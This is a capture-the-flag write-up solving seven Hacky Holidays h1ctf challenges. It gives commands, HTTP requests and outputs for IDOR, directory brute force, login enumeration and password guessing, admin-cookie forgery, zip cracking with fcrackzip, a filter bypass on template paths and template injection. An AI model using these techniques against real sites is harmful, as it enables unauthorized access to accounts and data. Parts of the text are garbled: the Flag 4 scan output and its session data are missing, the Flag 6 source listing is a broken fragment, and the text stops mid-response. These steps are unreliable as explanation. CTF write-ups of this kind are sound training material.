Full writeup follows. Thank you for hosting this CTF! -Sam # Flag 1 -- robots.txt Simply visiting https://hackyholidays.h1ctf.com/robots.txt reveals the first flag! ``` User-agent: * Disallow: /s3cr3t-ar3a Flag: flag{48104912-28b0-494a-9995-a203d1e261e7} ``` # Flag 2 -- JavaScript Most of the JavaScript on https://hackyholidays.h1ctf.com/ is externally hosted. There is one exception: https://hackyholidays.h1ctf.com/assets/js/jquery.min.js On closer inspection, this jQuery version has been modified. The difference becomes obvious when de-minified and diffed with an externally hosted copy: `diff <(curl https://hackyholidays.h1ctf.com/assets/js/jquery.min.js 2>/dev/null | js-beautify) <(curl https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js 2>/dev/null | js-beautify) | grep "h1"` (linux req: https://github.com/beautify-web/js-beautify) Output: ``` < h1_0 = 'la', < h1_1 = '}', < h1_2 = '', < h1_3 = 'f', < h1_4 = 'g', < h1_5 = '{b7ebcb75', < h1_6 = '8454-', < h1_7 = 'cfb9574459f7', < h1_8 = '-9100-4f91-'; < document.getElementById('alertbox').setAttribute('data-info', h1_2 + h1_3 + h1_0 + h1_4 + h1_2 + h1_5 + h1_8 + h1_6 + h1_7 + h1_1); ``` Running this JavaScript reconstructs the flag: ``` h1_0 = 'la', h1_1 = '}', h1_2 = '', h1_3 = 'f', h1_4 = 'g', h1_5 = '{b7ebcb75', h1_6 = '8454-', h1_7 = 'cfb9574459f7', h1_8 = '-9100-4f91-'; console.log( h1_2 + h1_3 + h1_0 + h1_4 + h1_2 + h1_5 + h1_8 + h1_6 + h1_7 + h1_1); ``` Output: `flag{b7ebcb75-9100-4f91-8454-cfb9574459f7}` # Flag 3 -- /people-rater ### Basic functionality https://hackyholidays.h1ctf.com/people-rater lists people. When you click a name, their rating is revealed. This rating uses an API, for example: https://hackyholidays.h1ctf.com/people-rater/entry?id=eyJpZCI6Mn0= Output: ``` { "id": "eyJpZCI6Mn0=", "name": "Tea Avery", "rating": "Awful" } ``` ### Hack Note the base64 `id` parameter above. The decoded base64 is `{"id":2}`. A careful examination of the page reveals that `{"id":1}` is skipped in the list of people. Sending `{"id":1}` directly to the API reveals the flag: https://hackyholidays.h1ctf.com/people-rater/entry?id=eyJpZCI6MX0= Output: ``` { "id": "eyJpZCI6MX0=", "name": "The Grinch", "rating": "Amazing in every possible way!", "flag": "flag{b705fb11-fb55-442f-847f-0931be82ed9a}" } ``` # Flag 4 -- /swag-shop ### Basic functionality https://hackyholidays.h1ctf.com/swag-shop is a store where the user is not authenticated. No credentials are provided and the user cannot register. ### Hack Using dirsearch recursively on /swag-shop, we can identify API endpoints: ``` # python3 dirsearch.py -e conf,config,bak,backup,swp,old,db,sql,asp,aspx,aspx~,asp~,py,py~,rb,rb~,php,php~,bak,bkp,cache,cgi,conf,csv,html,inc,jar,js,json,jsp,jsp~,lock,log,rar,old,sql,sql.gz,http://sql.zip,sql.tar.gz,sql~,swp,swp~,tar,tar.bz2,tar.gz,txt,wadl,zip,.log,.xml,.js.,.json ] } ``` The session with the longest string clearly stands out. Decoded that base64 string: `{"user":"C7DCCE-0E0DAB-B20226-FC92EA-1B9043","cookie":"NDU0ODI5MmY3ZDY2MjRiMWE0MmY3NGQxMWE0ODMxMzg2MGE1YWRhMTc0YjhkYWE3MzU1MjZjNDg5MDQ2Y2JhYjY3YTFhY2Q3YjBmYTk4N2Q5ZWQ5MWQ5OWFkNWE2MjIyZmZjMzZjMDQ3ODk5ZmI4ZjZjOWU0OGJhMjIwNmVkMTY="}` Visiting the /api/user endpoint we are clearly missing API fields: https://hackyholidays.h1ctf.com/swag-shop/api/user Output: `{"error":"Missing required fields"}` Using the Burp Suite Param Miner Extension ("Guess GET parameters" option), we can easily identify the missing required field. This identifies the "secret" parameter `uuid`! Using the `uuid` provided above by the /api/session endpoint, we find the flag: https://hackyholidays.h1ctf.com/swag-shop/api/user?uuid=C7DCCE-0E0DAB-B20226-FC92EA-1B9043 Output: ``` { "uuid": "C7DCCE-0E0DAB-B20226-FC92EA-1B9043", "username": "grinch", "address": { "line_1": "The Grinch", "line_2": "The Cave", "line_3": "Mount Crumpit", "line_4": "Whoville" }, "flag": "flag{972e7072-b1b6-4bf7-b825-a912d3fd38d6}" } ``` # Flag 5 -- /secure-login ### Basic functionality https://hackyholidays.h1ctf.com/secure-login is a basic login page. ### Hack The default error message says "Invalid Username". Enumerating usernames using Burp Suite Intruder, we see the username `access` receives a different response: "Invalid Password" (wordlist: https://github.com/jeanphorn/wordlist/blob/master/usernames.txt) Enumerating passwords using Burp Suite Intruder with the built-in password word list, reveals the password is `computer`. After logging in with`access:computer`, we receive the error message "No Files To Download". The cookie set when logging in is: `securelogin=eyJjb29raWUiOiIxYjVlNWYyYzlkNThhMzBhZjRlMTZhNzFhNDVkMDE3MiIsImFkbWluIjpmYWxzZX0%3D;` Decoding this base64 reveals JSON with an "admin" field: `{"cookie":"1b5e5f2c9d58a30af4e16a71a45d0172","admin":false}` Changing `admin` to `true` and reloading this page reveals a link to a file: https://hackyholidays.h1ctf.com/my_secure_files_not_for_you.zip This zip file is password protected; however, we can brute-force this password: ``` # fcrackzip -u -v -D -p 'xato.txt' my_secure_files_not_for_you.zip found file 'xxx.png', (size cp/uc 215105/215058, flags 9, chk 852f) found file 'flag.txt', (size cp/uc 55/ 43, flags 9, chk 82ca) PASSWORD FOUND!!!!: pw == hahahaha ``` (tool used: http://manpages.ubuntu.com/manpages/trusty/man1/fcrackzip.1.html) (word list used: https://github.com/danielmiessler/SecLists/blob/master/Passwords/xato-net-10-million-passwords-1000000.txt) With this password we can print our flag: ``` wget -q https://hackyholidays.h1ctf.com/my_secure_files_not_for_you.zip 2>&1 > /dev/null unzip -P hahahaha my_secure_files_not_for_you.zip 2>&1 > /dev/null cat flag.txt rm my_secure_files_not_for_you.zip rm flag.txt rm xxx.png ``` Output: `flag{2e6f9bf8-fdbd-483b-8c18-bdf371b2b004}` # Flag 6 -- /my-diary ### Basic functionality https://hackyholidays.h1ctf.com/my-diary/ reveals the Grinch's diary! Notably, the page redirects to https://hackyholidays.h1ctf.com/my-diary/?template=entries.html ### Hack Guessing other possible template file names, I reached: https://hackyholidays.h1ctf.com/my-diary/?template=index.php This loads the PHP source code of base page (`index.php`) as a template and renders it as html, allowing us to see the PHP source code behind this page: ``` secretsecretadmin.phpadmin.php): secretsecretadmin.phpadmin.php str_replace("admin.php","",$page) bypass (admin.php -> adminadmin.php.php): secretsecretadminadmin.php.phpadminadmin.php.php ``` Using our bypass, we reveal the flag: https://hackyholidays.h1ctf.com/my-diary/?template=secretsecretadminadmin.php.phpadminadmin.php.php `flag{18b130a7-3a79-4c70-b73b-7f23fa95d395}` # Flag 7 -- /hate-mail-generator ### Basic functionality https://hackyholidays.h1ctf.com/hate-mail-generator is a mail generator that uses a custom templating language. ### Hack Using dirsearch here reveals a `templates` directory: ``` # python3 dirsearch.py -e conf,config,bak,backup,swp,old,db,sql,asp,aspx,aspx~,asp~,py,py~,rb,rb~,php,php~,bak,bkp,cache,cgi,conf,csv,html,inc,jar,js,json,jsp,jsp~,lock,log,rar,old,sql,sql.gz,http://sql.zip,sql.tar.gz,sql~,swp,swp~,tar,tar.bz2,tar.gz,txt,wadl,zip,.log,.xml,.js.,.json -r -u https://hackyholidays.h1ctf.com/hate-mail-generator/ _|. _ _ _ _ _ _|_ v (_||| _) (/_(_|| (_| ) Extensions: conf, config, bak, backup, swp, old, db, sql, asp, aspx, aspx~, asp~, py, py~, rb, rb~, php, php~, bkp, cache, cgi, csv, html, inc, jar, js, json, jsp, jsp~, lock, log, rar, sql.gz, http://sql.zip, sql.tar.gz, sql~, swp~, tar, tar.bz2, tar.gz, txt, wadl, zip, .log, .xml, .js., .json | HTTP method: get | Threads: 10 | Wordlist size: 23721 | Recursion level: 1 Target: https://hackyholidays.h1ctf.com/hate-mail-generator/ [03:50:37] Starting: [03:51:45] 200 - 2KB - /hate-mail-generator/new [03:52:00] 302 - 0B - /hate-mail-generator/templates -> /hate-mail-generator/templates/ [03:52:00] 200 - 623B - /hate-mail-generator/templates/ [03:52:05] Starting: templates/ Task Completed ``` This directory is not properly protected. Visiting it reveals a directory list: https://hackyholidays.h1ctf.com/hate-mail-generator/templates/ ``` Index of /hate-mail-generator/templates/ ../ cbdj3_grinch_header.html 20-Apr-2020 10:00 - cbdj3_grinch_footer.html 20-Apr-2020 10:00 - 38dhs_admins_only_header.html 21-Apr-2020 15:29 46 ``` We want to access the template `38dhs_admins_only_header.html`. Attempting to preview a email containing the template `You do not have access to the file 38dhs_admins_only_header.html` reveals the following error: HTTP Request: ``` POST /hate-mail-generator/new/preview HTTP/1.1 Host: hackyholidays.h1ctf.com Content-Type: application/x-www-form-urlencoded Content-Length: 73 Connection: close preview_markup={{template:38dhs_admins_only_header.html}}&preview_data={} ``` HTTP Response: ``` HTTP/1.1 200 OK Server: nginx/1.18.0 (Ubuntu) Date: Sat, 26 Dec 2020 03:58:48 GMT Content-Type: text/html; charset=UTF-8 Connection: close Content-Length: 64 You do not have access to the file 38dhs_admins_only_header.html ``` We can bypass this using the `preview_data` field which appears to pre-process the markup. This pre-process is done after the permission checks occur on the allowable templates, but before the templates are loaded! HTTP Request: ``` POST /hate-mail-generator/new/preview HTTP/1.1 Host: hackyholidays.h1ctf.com Content-Type: application/x-www-form-urlencoded Content-Length: 110 Connection: close preview_markup={{test}}{{email}}&preview_data={"test":"{{template:","email":"38dhs_admins_only_header.html}}"} ``` HTTP Response: ``` HTTP/1.1 200 OK Server: nginx/1.18.0 (Ubuntu) Date: Sat, 26 Dec 2020 04:00:50 GMT Content-Type: text/html; charset=UTF-8 Connection: close Content-Length: 339
